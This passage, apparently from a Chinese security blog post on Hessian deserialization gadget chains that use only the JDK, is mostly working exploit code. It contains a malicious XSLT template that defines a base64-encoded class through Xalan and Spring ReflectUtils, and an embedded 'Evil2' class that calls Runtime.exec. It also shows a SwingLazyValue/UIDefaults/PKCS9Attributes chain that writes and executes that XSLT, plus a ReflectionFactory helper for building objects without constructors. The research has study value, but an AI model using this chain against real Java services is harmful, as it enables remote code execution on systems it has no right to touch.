+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String xsltTemplate = &quot;&lt;xsl:stylesheet version=\&quot;1.0\&quot; xmlns:xsl=\&quot;http://www.w3.org/1999/XSL/Transform\&quot;\n&quot; +</span><br><span class="line">            &quot;xmlns:b64=\&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\&quot;\n&quot; +</span><br><span class="line">            &quot;xmlns:ob=\&quot;http://xml.apache.org/xalan/java/java.lang.Object\&quot;\n&quot; +</span><br><span class="line">            &quot;xmlns:th=\&quot;http://xml.apache.org/xalan/java/java.lang.Thread\&quot;\n&quot; +</span><br><span class="line">            &quot;xmlns:ru=\&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\&quot;\n&quot; +</span><br><span class="line">            &quot;&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;xsl:template match=\&quot;/\&quot;&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;xsl:variable name=\&quot;bs\&quot; select=\&quot;b64:decodeBuffer(b64:new(),&#x27;&lt;base64_payload&gt;&#x27;)\&quot;/&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;xsl:variable name=\&quot;cl\&quot; select=\&quot;th:getContextClassLoader(th:currentThread())\&quot;/&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;xsl:variable name=\&quot;rce\&quot; select=\&quot;ru:defineClass(&#x27;&lt;class_name&gt;&#x27;,$bs,$cl)\&quot;/&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;xsl:value-of select=\&quot;$rce\&quot;/&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;/xsl:template&gt;\n&quot; +</span><br><span class="line">            &quot;  &lt;/xsl:stylesheet&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>最终可以构建出一个利用加载上传的恶意xslt文件实现命令执行的payload。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">String</span> <span class="variable">xsltTemplate</span> <span class="operator">=</span> <span class="string">&quot;&lt;xsl:stylesheet xmlns:xsl=\&quot;http://www.w3.org/1999/XSL/Transform\&quot; version=\&quot;1.0\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:bs64=\&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ob=\&quot;http://xml.apache.org/xalan/java/java.lang.Object\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:th=\&quot;http://xml.apache.org/xalan/java/java.lang.Thread\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ru=\&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;xsl:template match=\&quot;/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;bs\&quot; select=\&quot;bs64:decodeBuffer(bs64:new(),&#x27;&lt;base64_payload&gt;&#x27;)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;cl\&quot; select=\&quot;th:getContextClassLoader(th:currentThread())\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;rce\&quot; select=\&quot;ru:defineClass(&#x27;&lt;class_name&gt;&#x27;,$bs,$cl)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:value-of select=\&quot;$rce\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/xsl:template&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/xsl:stylesheet&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAIQoABwAUCgAVABYIABcKABUAGAcAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTEV2aWwyOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGQEAClNvdXJjZUZpbGUBAApFdmlsMi5qYXZhDAAIAAkHABwMAB0AHgEABGNhbGMMAB8AIAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAVFdmlsMgEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAACAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAAAQAMAAAADAABAAAABQANAA4AAAAIAA8ACQABAAoAAABPAAIAAQAAAA64AAISA7YABFenAARLsQABAAAACQAMAAUAAwALAAAAEgAEAAAABAAJAAcADAAFAA0ACAAMAAAAAgAAABAAAAAHAAJMBwARAAABABIAAAACABM=&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xslt</span> <span class="operator">=</span> xsltTemplate.replace(<span class="string">&quot;&lt;base64_payload&gt;&quot;</span>, base64Code).replace(<span class="string">&quot;&lt;class_name&gt;&quot;</span>, <span class="string">&quot;Evil2&quot;</span>);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;D:/IDEA_Projects/Heesian_Learning/attack&quot;</span>, xslt.getBytes()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XT&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, <span class="string">&quot;file:///D:/IDEA_Projects/Heesian_Learning/attack&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID,value2);</span><br><span class="line"><span class="comment">//        uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID,value2);</span></span><br><span class="line">        Object o= obj(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>);</span><br><span class="line">        setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        o.toString();</span><br></pre></td></tr></table></figure>
+<h6 id="新的反射利用方式">新的反射利用方式</h6>
+<p>使用ReflecionFactory创建对象实例，是不会初始化成员变量的，那么它的使用方法是什么呢？使用这种方法创建的对象，他的字段是不会被初始化的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ReflectionFactory对象，它本身是单例的</span></span><br><span class="line"><span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line"><span class="comment">//通过Object类获取该类的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Object.class.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//使用Object类的类构造器，来获取任意类的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> reflectionFactory.newConstructorForSerialization(User.class, constructor);</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p>综合之后使用的方式如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">obj</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> createWithoutConstructor(Class.forName(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createWithoutConstructor</span><span class="params">(Class targetclass)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(targetclass, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createWithConstructor</span> <span class="params">( Class targetclass, Class constructorClass, Class[] argstype, Object[] args )</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">exconstructor</span> <span class="operator">=</span> constructorClass.getDeclaredConstructor(argstype);</span><br><span class="line">        exconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construtor</span> <span class="operator">=</span> reflectionFactory.newConstructorForSerialization(targetclass, exconstructor);</span><br><span class="line">        <span class="keyword">return</span> construtor.newInstance(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/" title="Hessian仅在JDK下的利用链研究">https://f4nx1ng.github.io/2024/08/13/Hessian仅在JDK下的利用链研究/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag"># 自动化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/12/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="SnakeYaml反序列化">
+                  <i class="fa fa-angle-left"></i> SnakeYaml反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
